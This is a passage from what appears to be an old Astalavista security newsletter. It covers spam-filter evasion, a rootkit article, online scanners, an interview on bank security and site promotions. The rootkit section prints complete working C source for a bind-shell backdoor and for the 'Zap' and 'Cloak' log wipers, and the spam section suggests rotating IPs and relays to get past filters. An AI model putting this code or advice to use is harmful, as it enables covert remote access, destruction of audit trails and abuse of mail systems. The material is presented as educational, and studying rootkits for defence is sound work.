+A message reaching an SMTP server, claiming to be 'from' an email address for which there is no record, 
+in the Domain Name Service system, of a receiving SMTP server, may be filtered, on that basis. This can 
+force a spammer to provide a 'from' address with a legitimate domain name, causing any misdelivered email 
+to be bounced to the provider address. The administrator of the network that receives this bounced traffic 
+may then have a basis for criminal legal action, on the basis that the spammer's bounced mail represented a 
+Distributed Denial of Service (DDoS) attach upon their network; a form of 'hacking' that is punishable under 
+criminal law, in many legal jurisdictions. Another common solution to this form of filtering, is to use 
+either the destination address, or just the domain portion of the destination address, to make up the 'from'
+address; again, some SMTP servers will filter mail using these tactics. The most common form that this sort of
+filtering takes, is to filter any mail claiming to be from a domain that is hosted by the destination SMTP
+server, and is not coming from the IP network served by that server. SMTP servers also commonly filter
+email coming from the same IP address, by progressively introducing delays into the delivery process,
+slowing down the amount of messages per hour that the SMTP mail server will accept from the spammer.
+(This tactic is especially effective at limiting the throughput of spammers who use 'throwaway accounts'
+to get their mailing out, via the SMTP relay tactic, on their own Internet access provider.) 
+A useful counter-countermeasure for this tactic, is to send the email from multiple, rotating IP addresses,
+perhaps by relaxing it through multiple SMTP replays (assuming that the SMTP replay does not implement this
+tactic, proxies, or (in the case of CGI spam tactics), web servers.
+
+Some SMTP servers will filter mail based upon the 'Subject' header in the email. This commonly takes the
+form of examining the frequency with which a particular 'Subject' header appears in email messages passing
+through the server, and blocking these messages, once they exceed some predetermined threshold.
+
+Users:
+
+Users can typically filter mail on the basis of content, subject, or 'from' address. Few users actually
+implement any sort of filters, unless their email service provider does so, on their behalf (United States
+courts have occasionally ruled that this violates the rules of free speech and/or free trade, 
+but on the whole, have maintained that network operators have the right to determine what traffic to permit
+on their networks), or unless they begin to receive a great deal of spam. Nonetheless, all of the efforts of
+any spammer, cannot guarantee that an intended recipient will ever receive a specific email, or that they
+will ever read it, when it arrives.
+
+Spamhauses will often sell the service of sending out email on behalf of their customers, and spam 
+software vendors will frequently sell their software, on the basis of either the amount of mail that can be
+sent out, or on the basis that mail is more likely to get into the destination inboxes. No one can guarantee
+delivery. Once again, for emphasis: No one can guarantee delivery. The recipient can easily filter messages,
+so that all of the best efforts of everyone, will not get them to read the  message - or they can simply not 
+read their email at all. It's true that some tactics get out more mail than others, and some tactics have
+a better shot at delivery than others. But it is also true that someone is not interested in a spammer's
+content, no one can make them read it.
+
+There are some things that can be done, to determine whether users are reading a spammer's content, 
+and the strength, quality, and immediately of their reaction to it: these tactics will be covered in 
+a separate document in the next future.
+
+The Art of Rootkits 
+By Marcus
+http://www.invisibleghosts.net/
+unknownmarcus[at]hotmail.com
+
+What is a rootkit?
+
+Rootkits come in all different shapes and styles, some more advanced than others. 
+Rootkits are basically programs that help attackers keep their position as root. 
+Notice it's called a "rootkit". 'root' meaning the highest level of administration on 
+*nix based systems and 'kit' meaning a collection of tools. Rootkits contain tools which help
+attackers hide their presence as well as give the attacker full control of the server or host
+continuously without being noticed.
+
+Rootkits are usually installed on systems when they have been successfully compromised and the
+highest level of access has been given (usually root) Some rootkits refuse to be installed until
+the attacker has root access, due to read and write permission to certain files. Once the system
+has been successfully compromised and the attacker has root, he\she may then install the rootkit,
+allowing them to cover their tracks and wipe the log files. 
+
+A typical rootkit consists of the following utilities:
+
+* Backdoor Programs - login backdoors, telnetd etc
+* Packet Sniffers   - Sniff network traffic such as FTP, TELNET,POP3
+* Log-Wiping Utilities - Bash the logs to cover tracks
+* DDoS Programs - Turn the box into a DDoS client 
+* IRC\Bots  - Bots used to take over IRC channels 
+* Miscellaneous programs - May contain exploit, log editor
+
+Different types of rootkits
+
+Application rootkits - Established at the application layer
+Kernel rootkits - Established at the kernel level (Core of any OS)
+
+When I say "established" this could be referred to of where exactly the rootkit hides. 
+
+Now let's start of by looking at an application rootkit.
+
+An application rootkit is basically a rootkit which "replaces" all the well know system binary files
+(ls, netstat, killall) with "fake" or "Trojanned" ones. The trojaned or fake system files will help
+hide the attackers presence, report false information to the system administrator and even provide
+a Backdoor for the attacker. To help you understand this more I have provided a list of all the
+typical system files, which are "replaced" to, help the attacker cover his or her tracks. 
+The list was taken from "Rootkit: Attacker Undercover Tools" by Sailman Manap.
+
+Programs replace to hide attacker presence
+
+� "ls", "find", "du" - Trojaned system file will be able to hide attackers file, directory
+and stuff that have been brought into the system from being listing.
+� "ps", "top", "pidof" - All these programs are process monitor program. Trojaned
+program will hide attacker process from being listing.
+� "netstat" - netstat is used to check network activity such as open port, network
+connections establish and listening. Trojaned netstat will hide processes installed by
+attacker such as ssh daemon or other services.
+� "killall" - Trojaned "killall" will not be able to kill attacker process.
+� "ifconfig" - When sniffer is running PROMISC flag is set to the nic. "ifconfig" is a
+handy utility to set and to view setting of ethernet nic. Trojaned "ifconfig" will not
+display the PROMISC flag when sniffer is running. This is useful to hide sniffer from
+being detected.
+� "crontab" - Trojaned "crontab" will hide the attacker뭩 crontab entry.
+� "tcpd", "syslogd" - Trojanised "tcpd" and "syslog" will not log any connection made
+by attacker. "tcpd" also capable to bypass tcp wrapper enforcement.
+
+Let's take a look at a Kernel rootkit.
+
+A Kernel rootkit is a rootkit that buries itself deep in the Kernel. 
+This makes it extremely hard to detect and remove. Kernel rootkits are more advanced than
+Application rootkits, A Kernel rootkit works by exploiting and manipulating various Kernel
+capabilities. Kernel rootkits work, basically by exploiting LKM. (Loadable Kernel Modules)LKM are
+used to load device drivers on a "as-needed" bases. LKM are usually only exploited so the attacker
+can perform malicious activity.
+
+Kernel rootkits are more dangerous than Application rootkits because instead of just replacing
+the basic binaries like "ls" and "netstat" they attack the kernel directly and manipulate system-calls
+like open() and read(). As we know application rootkits replace binaries; if the administrator was
+clever and analyzed the actual binaries which had been replaced, they will realize the differences
+in size (e.g. the program could contain an extra 128 bytes). However, this wouldn't be possible with
+Kernel rootkits because instead of actually changing the size and structure of the program, they just
+change the way the program operates. For example programs like "ps" use an open system call "open()" and
+reads information from files in the directory /proc, where also the information about running processes
+is kept. 
+
+How the Kernel Works
+
+What is a Kernel? In English and using non-technical jargon a Kernel is basically the "Core" of the OS
+(Linux, Unix, Windows). Without the Kernel an Operating System could not load.
+
+The Kernel is one of the first things which load in a OS and it remains in the main memory. Since it's
+staying in the main memory, its *very* important for the Kernel to be as small as possible, but at the same
+time be able to provide all the essential programs, services, devices, applications and drivers for the OS.
+Typically, the kernel is responsible for I/O(Input and Output) management, Device drivers, CPU management, 
+process and task management, and disk management.
+
+The kernel looks something like this....
+
+ _ _ _ _ _ _ _ _ _ 
+|Applications and |        - LKM - System Calls
+|_Programs_ _ _ _ |
+*******************
+*  MAIN KERNEL    *        - Consists of:  Memory Management
+*                 *                        I\O Management
+*******************                        CPU Management
+|    Hardware      |                       Device Drivers
+|_ _ _ _ _ _ _ _ _ |
+
+
+Backdoors
+
+Most of today뭩 (decent) rootkits contain "Backdoors". Now you should all know what a Backdoor is but
+just in case you didn't I will quickly give a brief explanation of all.
+
+Backdoor - A program or script which allows an attacker to establish some form of privilege and remote
+communication without logging into the system. Backdoors are usually installed when the system has been
+successfully compromised and some form of exploit has been entailed. The advantage of installing a
+backdoor on a system means that the attacker doesn't have to keep using the same exploit over and over again.
+The disadvantage of installing a backdoor means at one point or another the system administrator will
+notice suspicious activity in his network traffic, if he or she were to run a port scanner such as Nmap 
+(coded by Fyodor http://www.insecure.org), he or she would soon uncover an open port and sooner or later
+remove the backdoor.
+
+A typical example of a Windows NT\2000 backdoor is one entitled "Tini.exe" (Made by NTSecurity) 
+This little program listens on port 7777 for incoming connections, once a connection has been established
+a remote command shell is executed for the attacker who establishes the connection. 
+(Now, as I have mentioned, this t-file generally deals with *nix backdoors, so I don't really want to get
+side stepped talking about windows backdoors, exploits etc.I thought I'd just mention tini.exe to give you
+a general idea of what a Backdoor consists of.
+
+Now let's talk more about *Nix backdoors. *nix backdoors come in *many* shapes and sizes. The paper by
+Sailman Manap gives yet another long comprehensive list of all the forms backdoors come in:
+
+Login Backdoor - Modifying login.c to look for backdoor password before stored
+password. Attacker can log into any account using backdoor password.
+- Telnetd Backdoor - Trojaned the "in.telnetd" to allow attacker gain access with
+backdoor password.
+- Services Backdoor - Replacing and manipulate services like "ftp", "rlogin", even
+"inetd" as backdoor to gain access.
+- Cronjob backdoor - Backdoor could also be added in "crontjob" to run on specific time
+for example at 12 midnight to 1 am.
+- Library backdoors - Almost every UNIX and Windows system have shared libraries.
+Shared libraries can be backdoor to do malicious activity including giving a root or
+administrator access.
+- Kernel backdoors - This backdoor is basically exploiting the kernel, which is core of
+the operating system to handle and to hide backdoor effectively 
+- Network traffic backdoors which typically using TCP, UDP, and ICMP - Backdoor that
+Exploiting network traffic protocol is widely used. In TCP protocol backdoor like ssh is
+Popularly used because it communicate in encrypt, while crafting and tunneling packet
+In UDP and ICMP traffic will give a better chances escaping from firewall and "netstat".
+
+All of these and any other forms of *nix backdoors are explained and documented by Christopher Klaus,
+his paper can be
+found at http://secinf.net/info/unix/backdoors.txt, I strongly recommend you check it out if you are
+either really interested in Backdoors or you still haven뭪 grasped the basic concepts of Backdoors.
+
+To finish of this section on backdoors, I will show you a basic TCP Backdoor for *nix.Credits to shaun2k2
+for writing this code.
+
+----START-----------------------------
+
+/* backdoor.c - basic unix tcp backdoor.
+ *
+ * This is a basic UNIX TCP backdoor.  /bin/sh is binded to the port of your
+ * choice.  Access the shell with telnet or netcat:
+ *
+ * root# nc -v hackedhost.com 1337
+ *
+ * I do not take responsibility for this code.
+ */
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#define BACKLOG 5
+#define SHELL "/bin/sh"
+
+void usage();
+
+int main(int argc, char *argv[]) {
+if(argc <2) {
+	usage(argv[0]);
+}
+
+int sock, csock;
+struct sockaddr_in client;
+struct sockaddr_in mine;
+if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+printf("Couldn't make socket!\n");						exit(-1);
+}
+
+mine.sin_family = AF_INET;
+mine.sin_port = htons(atoi(argv[1]));
+mine.sin_addr.s_addr = INADDR_ANY;
+if(bind(sock, (struct sockaddr *)&mine, sizeof(struct sockaddr)) == -1) {
+printf("Could not bind socket!\n");
+exit(-1);
+}
+
+if(listen(sock, BACKLOG) == -1) {
+printf("Could not listen on socket!\n");
+exit(-1);
+}
+
+printf("Listening for connections on port %s!\n", argv[1]);
+
+while(1) {
+	int sin_size;
+	sin_size = sizeof(struct sockaddr);
+	csock = accept(sock, (struct sockaddr *)&client, &sin_size);
+	dup2(csock, 0);
+	dup2(csock, 1);
+	dup2(csock, 2);
+	execl("/bin/sh","/bin/sh",(char *)0);
+	close(csock);
+} 
+}
+
+void usage(char *progname[]) {
+	printf("Usage: %s <port>\n", progname);
+	exit(-1);
+}
+
+-------END---------------------------------------
+ 
+Sniffers
+
+A lot of today뭩 rootkits contain programs known as "Sniffers". What are Sniffers? 
+(Also known as Packet Sniffers)
+Basically packet Sniffers are programs that are made to "Monitor" network traffic, TCP\IP or any other
+network device. I'm sure you know when you are browsing the Internet or playing online games "Packets"
+of data are going to and from your Computer. Attackers install Sniffers so they can capture valuable
+information which is floating to and from your computer. 
+
+What type of valuable information?
+Here is a list of what a Sniffer is capable of...
+
+- Sniffing FTP passwords
+- Sniffing Telnet passwords
+- Sniffing Network passwords
+- Sniffing POP3 passwords
+- Capturing websites you have visited
+- Sniffing Gateways
+- Lots more
+
+Other services such as ftp and telnet transfer their passwords in plain text, so it would be easy for
+an attacker to just capture the packet then dump it into a text editor (such as "vi", "Pico" or for M$ notepad)
+it would only take a couple of minutes for an attacker to uncover the plain text password.
+
+For more information on Sniffers please read http://www.sans.org/infosecFAQ/switchednet/sniffers.htm 
+this paper was written by a "Jason Drury" and I have found it most useful. If you are more interested
+in Windows Sniffers, then I recommend getting a copy of the following:
+
+-Windows Sniffer
+-TcpDump
+-Password Capture   --------> Made especially to sniff passwords
+-Sniff
+-Ethereal
+-EtherPeep
+
+My personal favorite Sniffer for Windows has to be TCPDump it's command line driven so the scripties wouldn't
+go near it but for those truly interested in the elements of computer security I would recommend TCPDump,
+it will take time getting used to it but its worth it.
+
+Log cleaners
+
+We come to something a lot more simpler, Log Bashers(Also known as Log deleters, Log killers and Log Cleaners)
+
+No matter what the title they all do the same thing. Delete system log files. System Administrators rely
+on logging as an extra form of security. Log files can keep track on who logged in last and at what type,
+what programs were run as that user was logged in etc.
+
+Here's a very simple script I made to demonstrate what I mean:
+
+-------START------
+
+int main()
+system("rm-rf /root/logs/LastEntry.log");
+touch(" /root/Logs/LastEntry.log");
+return 0;
+
+-------END--------
+
+Now for those who don't know any C, then I shall explain. The first main line of the code is telling the
+C program to remove the file LastEntry.log, delete it. The second line is telling the program to create
+a file called LastEntry.log in the exact same location.
+
+Some log cleaners search certain directories for words like "IP" "Login", "Logs", "Log" etc and then 
+delete them. Some just delete all the default log files that are in the default system location.
+
+This is a very old log cleaner called "Zap":
+
+----START----
+
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/file.h>
+#include <fcntl.h>
+#include <utmp.h>
+#include <pwd.h>
+#include <lastlog.h>
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+ 
+int f;
+ 
+void kill_utmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+ 
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                 write (f, &utmp_ent, sizeof (utmp_ent));
+            }
+     close(f);
+  }
+}
+ 
+void kill_wtmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+    long pos;
+ 
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
+ 
+     while(pos != -1L) {
+        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
+          pos = -1L;
+        } else {
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+               bzero((char *)&utmp_ent,sizeof(struct utmp ));
+               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+               write (f, &utmp_ent, sizeof (utmp_ent));
+               pos = -1L;
+          } else pos += 1L;
+        }
+     }
+     close(f);
+  }
+}
+ 
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+ 
+     if ((pwd=getpwnam(who))!=NULL) {
+ 
+        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
+            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+            bzero((char *)&newll,sizeof( newll ));
+            write(f, (char *)&newll, sizeof( newll ));
+            close(f);
+        }
+ 
+    } else printf("%s: ?\n",who);
+}
+ 
+main(argc,argv)
+int argc;
+char *argv[];
+{
+    if (argc==2) {
+        kill_lastlog(argv[1]);
+        kill_wtmp(argv[1]);
+        kill_utmp(argv[1]);
+        printf("Zap2!\n");
+    } else
+    printf("Error.\n");
+}
+
+----END----
+
+Here is another little log cleaner called Cloak v1.0 it wipes your presence on SCO, BSD, Ultrix, 
+and HP/UX UNIX. This program is *old* and was written by Wintermute of -Resist-
+
+-------START-------
+
+/* UNIX Cloak v1.0 (alpha)  Written by: Wintermute of -Resist- */
+/* This file totally wipes all presence of you on a UNIX system*/
+/* It works on SCO, BSD, Ultrix, HP/UX, and anything else that */
+/* is compatible..  This file is for information purposes ONLY!*/
+
+/*--> Begin source...    */
+#include <fcntl.h>
+#include <utmp.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <lastlog.h>
+
+main(argc, argv)
+    int     argc;
+    char    *argv[];
+{
+    char    *name;
+    struct utmp u;
+    struct lastlog l;
+    int     fd;
+    int     i = 0;
+    int     done = 0;
+    int     size;
+
+    if (argc != 1) {
+         if (argc >= 1 && strcmp(argv[1], "cloakme") == 0) {
+	     printf("You are now cloaked\n");
+	     goto start;
+                                                           }
+         else {
+	      printf("close successful\n");
+	      exit(0);
+	      }
+		   }
+    else {
+	 printf("usage: close [file to close]\n");
+	 exit(1);
+	 }
+start:
+    name = (char *)(ttyname(0)+5);
+    size = sizeof(struct utmp);
+
+    fd = open("/etc/utmp", O_RDWR);
+    if (fd < 0)
+	perror("/etc/utmp");
+    else {
+	while ((read(fd, &u, size) == size) && !done) {
+	    if (!strcmp(u.ut_line, name)) {
+		done = 1;
+		memset(&u, 0, size);
+		lseek(fd, -1*size, SEEK_CUR);
+		write(fd, &u, size);
+		close(fd);
+	    }
+	}
+    }
+
+
+    size = sizeof(struct lastlog);
+    fd = open("/var/adm/lastlog", O_RDWR);
+    if (fd < 0)
+	perror("/var/adm/lastlog");
+    else {
+	lseek(fd, size*getuid(), SEEK_SET);
+	read(fd, &l, size);
+	l.ll_time = 0;
+	strncpy(l.ll_line, "ttyq2 ", 5);
+	gethostname(l.ll_host, 16);
+	lseek(fd, size*getuid(), SEEK_SET);
+	close(fd);
+    }
+}
+
+-----END-----
+
+Rootkit뭩 Extra Features
+
+Some rootkits are well known for their advanced log cleaner, others for their advanced Backdoor and
+others for their advanced stealth hard to remove installation procedure.
+There are some rootkits which are well known for being SAR (Swiss Army Rootkits) basically, they are
+rootkits with average features plus a whole load of extra utilities such as Bots, DdoS, Extra scripts,
+Password crackers, Killer scripts etc
+
+Rootkits that contain scripts that cause DDoS attacks are considered dangerous; if an attacker were to
+exploit 100's of servers and install such a rootkit those servers would then become "Zombies" they could
+launch DDoS attacks (SYN, PING, FINGER, UDP, TCP) against chosen targets. Rootkits are continuously being
+made more advance and extra utilities are being added on each time.
+
+Analyses of the Application Rootkit "T0rnkit"
+
+"T0rnkit attempts to hide its presence when installed. During installation it first shuts down the
+system-logging daemon, syslogd. It then replaces several other system executables with trojanized
+versions and adds a trojanized ssh daemon to the system as well. Programs that are replaced are, 
+among others; du, find, ifconfig, login, ls, netstat, ps, sz and top. If the system administrator uses
+these somewhat vital functions, they report normal looking information, but the processes and network
+connections that the hacker uses aren't shown. Finally T0rnkit starts a Sniffer in background, enables
+telnetd, rsh and finger daemons in "/etc/inetd.conf", restarts inetd to activate changes made and starts
+syslogd again. This all without the system administrator knowing about it. 
+
+Noteworthy is that all new programs in the t0rnkit all have the exact size of 31.336 bytes. 
+T0rnkit usually can be found in the directory /usr/src/.puta, but,of course, not if it already has been
+activated because the command 'ls' will have been replaced. With the standard installation of t0rnkit
+TCP port 47017 is open for root access to the system. A modified version of this rootkit was also
+distributed by a variant of Unix/Lion worm.
+
+I hope this paper gave you an insight of what rootkits really are.
+
+Recommended reading and useful Links:
+
+Sunnie Hawkins, Understanding the Attackers Toolkit, January 13, 2001,URL:
+http://www.sans.org/infosecFAQ/linux/toolkit.htm
+
+Andrew R. Jones, A Review of Loadable Kernel Modules, June 12, 2001, URL:
+http://www.sans.org/infosecFAQ/linux/kernel_mods.htm
+
+Jason Drury, Sniffers: What are they and How to Protect From Them, November 11, 2000, URL:
+http://www.sans.org/infosecFAQ/switchednet/sniffers.htm
+
+DeokJo Jeon, Understanding DDOS Attack, Tools and Free Anti-tools with Recommendation,
+April 7, 2001,URL: http://www.sans.org/infosecFAQ/threats/understanding_ddos.htm
+
+Steve Gibson, The Strange Tale of the Denial OF Service Attacks Against GRC.COM, Gibson
+Research Corporation, Aug 31, 2001, URL: http://grc.com/dos/grcdos.htm
+
+Black Tie Affair, Hiding Out Under UNIX, Volume Three, Issue 25, File 6 of 11, March 25,
+1989, URL: http://www.phrack.org/show.php?p=25&a=6
+
+Christopher Klaus, Backdoors, August 4 1997, URL: http://secinf.net/info/unix/backdoors.txt
+
+09. Home Users Security Issues
+   --------------------------
+
+Due to the high number of e-mails we keep getting from novice users, we have
+decided that it would be a very good idea to provide them with their very
+special section, discussing various aspects of Information Security in an 
+easily understandale way, while, on the other hand, improve their current level of knowledge.
+If you have questions or recommendations for the section, direct 
+them to security@astalavista.net Enjoy yourself!
+
+Online Security Scanners
+
+Online Security Scanners are getting more and more popular for the average 
+Internet user concerned about his/her security. This article will give you an
+overview of the most popular ones, the difference between the types and it will help
+you pick up the one that will best help you secure your computer.
+
+The easy and the "freeware" nature of the online security scanners, has turned them
+into a valuble service for the average Internet user, seeking for services that
+will definitely enhance the security of his/her computer.
+
+We can distinguish two types of online security scanners, namely Port Scanners
+and Vulnerability Scanners.
+
+Online Port Scanners
+
+Usually, the port scanners offered online come with three options:
+
+- well known ports scan
+- trojans port scan
+- all ports scan
+
+The first one will save you a lot of time by scanning well known ports, while, on
+the other hand, it will definitely miss a backdoor or a trojan run on a port predefined 
+by the attacker. The second option will scan only well known trojans ports,
+however, this service is a bit outdated, the majority of trojans online, even the
+old one, have an option where the attacker can change the default port and in most
+of the cases it's changed. The third option attmpts to scan all the 65,535 ports
+and will usually take quite a lot of time to complete, depending on your connection
+speed of course.
+
+Online Vulnerability Scanners
+
+This is one of the most effective scanners, it tries to exploit a vulnerability
+in your browser or e-mail software using a large database of previously discovered
+problems with the type of software you're using.
+
+Here, I will provide you with some of the most popular and useful online security
+tests available, enjoy and get secure!
+
+http://www.hackerwhacker.com/
+http://scan.sygatetech.com/
+http://www.auditmypc.com/
+https://grc.com/x/ne.dll?bh0bkyd2
+http://security.norton.com/sscv6/default.asp?langid=ie&venid=sym
+http://www.windowsecurity.com/emailsecuritytest/
+http://stealthtests.lockdowncorp.com/
+
+10. Meet the Security Scene
+   -----------------------
+
+In this section you are going to meet famous people, security experts and
+all the folks who in some way contribute to the growth of the community.
+We hope that you will enjoy these interviews and that you will learn a lot of
+interesting information through this section. In this issue we have interviewed
+Richard Menta, a columnist and security expert at BankInfoSecurity.com
+Your comments are appreciated at security@astalavista.net
+
+------------------------------------------------
+Interview with Richard Menta http://BankInfoSecurity.com/
+
+Astalavist: Hi Richard, I would appreciate if you introduce yourself and the web
+site you represent, namely BankInfoSecurity.com
+
+Rich: My name is Richard Menta. I work for an information security consulting firm
+in NJ called Icons, Inc where I serve as a consultant and as the editor of
+BankInfoSecurity.com.
+
+About 90% of the Icons's clients are banks and credit unions. These
+institutions are heavily regulated regarding information security, yet
+despite this fact we found many of our clients needed much more education on
+the concepts of information security and the added threats and risks
+presented by technology. BankInfoSecurity.com was developed to help fill
+this need by aggregating the latest news and information, covering both the
+technical and regulatory aspects of InfoSec.
+
+Astalavista: What's the major difference between the security threats the financial
+sector is dealing with, compared with the general security ones?
+
+Rich: Privacy is the biggest issues with regards to financial institutions. They
+are mandated by the Gramm-Leach-Bliley Act (GLBA) to protect what is called
+the non-public personal information (NPPI) of their customers. The biggest
+security threat comes from intruders looking to garner NPPI to facilitate
+identity theft. As the relationship of financial institutions with their
+customers is highly based on trust and mass identity theft undermines that
+trust, it is a critical issue to control the theft of customer information.
+
+Astalavista: E-business wouldn't be profitable without E-commerce, what do you
+think are the major security problems E-shops face nowadays, how aware
+of the information security issue are the managers behind them, and what do
+you think can make a significant change in their mode of thinking?
+
+Rich: The biggest security issue is the lack of awareness as a whole. A good
+information security strategy takes significant effort and financial
+commitment, but many senior managers are unaware of the full breadth of what
+information security covers. There is a lot to grasp too as information
+security is an every evolving discipline that has to rapidly change with the
+changes in the threat environment.
+
+Awareness is still an issue in the banking industry where there is a federal
+examiner coming in once a year to tell management what they need to do. The
+reason is because examiners have only been focused on information security
+since 2001 (when the agencies started to enforce GLBA) and they are still
+learning the ins and outs. It's improving, though, as examiners are visibly
+becoming savvier with time and communicating more to the banks.
+
+Dramatic change in other industries is a bit more elusive as they have no
+such oversight as the banking industry does. Still, the Sarbanes-Oxley Act
+looks to drive better information security because a deficient security plan
+violates the due care requirements of the Act. As the act imposes criminal
+penalties for faulty compliance, there will be a lot more pressure once its
+tenets go into effect this fall.
+
+Astalavista: Malicious software has always been trying to get hold of sensitive
+financial information, how significant do you think is the threat from
+worms like the Bizex one in future?
+
+Rich: It is a significant problem as it goes back to the trust issue. All banks
+are adopting online banking, yet you have malicious code trying to take
+snapshots of your information as well as anyone else's who are in your
+address book.
+
+The FDIC recently posted a mandate that banks must have a written patch
+management program consisting of several steps. The reason the agency did
+this is because they realized that poorly patched systems posed a severe
+threat and most financial institutions were doing an insufficient job with
+regards to patch activities. Right now, the great majority of banks are
+highly susceptible to these worms, as are their average customers who rarely
+patch their home systems. Of course, even a great patch management program
+only goes so far, especially with zero day exploits.
+
+Astalavista: Despite the latest technology improvements and the security measures
+put in place by companies, a major part of the Internet users are still
+afraid to use their credit card online, who should be blamed and most
+importantly, what do you think should be done to increase the number of
+online customers who want to purchase a good or services but feel secure
+while doing it?
+
+Rich: Consumers are afraid for good reasons. How many prime trafficked sites have
+been broken? It is embarrassing, especially when it makes the national
+media. The latest technology improvements and security measures are good,
+but all merchants as a whole need to impose better security on their end.
+Those who don't improve measures will continue to undermine the efforts of
+those who do by perpetuating the insecurity that many patrons feel with
+regards to online shopping.
+
+Again, it's a trust issue and there are a significant amount of consumers
+who don't trust typing their credit card number into their browser. The good
+news is that as security improves throughout online commerce consumer trust
+will rise.
+
+Astalavista: What's your opinion on companies citing California's security breach
+disclosure law and notifying customers of a recent security breach?
+
+Rich: Most companies can absorb any financial losses arising from a breach. It is
+the damage to their reputation that poses the greatest risk. What is more
+embarrassing than notifying your customers their information was
+compromised? Not only does the customer lose trust in the company, but such
+a disclosure inevitably becomes public and that can hinder the ability to
+draw new customers.
+
+So why do I think this law is good? Because there is a general apathy among
+many organizations regarding their activities to properly protect their
+systems. Regulation has been the greatest motivator to improve security. In
+this case, forced disclosure is far more motivating than any fine.
+
+11. Security Sites Review
+   ---------------------
+
+The idea of this section is to provide you with reviews of various, highly interesting
+and useful security related web sites. Before we recommend a site, we make sure that it provides
+its visitors with quality and a unique content.
+
+http://www.makesecure.com/
+
+An information security web site offering, news, vulnerabilities and unique security content to its visitors
+
+http://net-security.org/
+
+Net-Security is a daily updated news site, containing a large number of security reviews, articles and interviews 
+
+http://www.ntsecurity.net/
+
+A site providing you with a huge database of Windows security related files, news and documents
+
+http://www.macintoshsecurity.com/
+
+Everything you need to know about how to secure your Mac
+
+http://www.hack3r.com/
+
+A security web site providing its visitors with the chance to participate in a Wargame
+
+12. Astalavista needs YOU!
+   ---------------------
+
+We are looking for authors that would be interested in writing security related
+articles for our newsletter, for people's ideas that we will turn into reality with their help and for anyone who
+thinks he/she could contribute to Astalavista in any way. Below we have summarized various issues that might 
+concern you.
+
+- Write for Astalavista -
+
+What topics can I write about?
+
+You are encouraged to write on anything related to Security:
+
+General Security
+Security Basics
+Windows Security
+Linux Security
+IDS (Intrusion Detection Systems)
+Malicious Code
+Enterprise Security
+Penetration Testing
+Wireless Security
+Secure programming
+
+What do I get?
+
+Astalavista.com gets more than 200 000 unique visits every day, our Newsletter has more than
+22,000 subscribers, so you can imagine what the exposure of your article and you will be, impressive, isn't it!
+We will make your work and you popular among the community!
+
+What are the rules?
+
+Your article has to be UNIQUE and written especially for Astalavista, we are not interested in
+republishing articles that have already been distributed somewhere else.
+
+Where can I see a sample of a contributed article?
+
+http://www.astalavista.com/media/files/malware.txt
+
+Where and how should I send my article?
+
+Direct your articles to dancho@astalavista.net and include a link to your article; once we take a look
+at it and decide whether is it qualified enough to be published, we will contact you within several days,
+please be patient.
+
+Thanks a lot all of you, our future contributors!
+
+13. Astalavista Security ToolBox DVD Promotion
+   --------------------------------------------
+
+- Astalavista's Security ToolBox DVD - 40% Discount - 29.90 USD (including Packaging and Shipping)
+
+Astalavista's Security Toolbox DVD is considered to be the largest and most comprehensive Information Security archive.
+As always we are committed to provide you with a resource for all of your security and hacking interests, 
+in an interactive way! The Information found on the Security Toolbox DVD
+has been carefully selected, so that you will only browse through quality information and tools.
+No matter if you are a computer enthusiast, a computer geek, a newbie looking for information on "how to hack",
+or an ITSecurity professional looking for quality and up to date information for offline use or just for
+convenience, we are sure that you will be satisfied, even delighted by the DVD!
+
+Main benefits:
+
+- Extremely comprehensive -
+- Very well sorted archive with detailed descriptions -
+- Large archive of Ebooks never released before -
+- Improved performance of the Security Toolbox, information has never been that easier to find -
+- People connecting from countries with slow connections can benefit and get all the Security information at their hands -
+- You will automatically become part of the new Astalavista's Promotion Service, meaning that you will receive information about promotions and special services, which is not going to be released to the public.
+
+--> Thousands of Security Related Web Sites <--
+--> Hundreds of Security Related tools and programs <--
+--> Countless Security white papers and publications <--
+--> Only ONE DVD <--
+--> Astalavista's Security ToolBox DVD <--
+
+14. Astalavista.net Advanced Member Portal Promotion
+   -------------------------------------------------
+
+- April offer Save 10% until 04/30/04  $26 - 6 months Membership
+- April offer Save 20% until 04/30/04  $79 - PREMIUM (Lifetime)
+
+Astalavista.net is world known and highly respected Security Portal offering
+an enormous database of very well sorted and categorized Information Security
+resources, files, tools, white papers, e-books and many more.At you disposal
+there are also thousands of working proxies, wargames servers where all the members
+try their skills and most importantly - the daily updates of the portal.
+
+- Over 3.5 GByte of Security Related data, daily updates and always working
+links.
+- Access to thousands of anonymous proxies from all over the world, daily updates
+- Security Forums Community where thousands of individuals are ready to share
+their knowledge and answer your questions, replies are always received no matter
+of the question asked.
+- Several WarGames servers waiting to be hacked, information between those
+interested in this activity is shared through the forums or via personal 
+messages, a growing archive of white papers containing info on previous
+hacks of these servers is available as well.
+
+http://www.Astalavista.net
+The Advanced Security Member Portal
+
+15. Final Words
+   -----------
+
+We believe this issue is the best one released so far, in terms of its content and the information we've provided you with.
+Thank for the nice words, keep them coming, because we want to know how we can improve our monthly newsletter.We, at Astalavista.com
+will continue to provide you with this free periodical coverage of what's going on in the security world, while on the other
+hand all we're asking for is - learn and get your systems secure.
+
+Editor - Dancho Danchev
